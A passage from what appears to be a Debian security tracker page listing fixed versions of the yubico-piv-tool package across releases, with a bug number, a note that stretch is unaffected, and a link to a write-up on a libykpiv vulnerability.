| [yubico-piv-tool](/tracker/source-package/yubico-piv-tool) ([PTS](https://tracker.debian.org/pkg/yubico-piv-tool)) | bullseye | 2.2.0-1 | fixed |
|  | bookworm | 2.2.0-1.1 | fixed |
|  | sid, trixie | 2.5.2-1 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [yubico-piv-tool](/tracker/source-package/yubico-piv-tool) | source | stretch | (not affected) |  |  |  |
| [yubico-piv-tool](/tracker/source-package/yubico-piv-tool) | source | (unstable) | 2.1.1-1 |  |  | [975612](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=975612) |

## Notes

```
[stretch] - yubico-piv-tool <not-affected> (Vulnerable code not present)
<https://blog.inhq.net/posts/yubico-libykpiv-vuln/>

```

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)


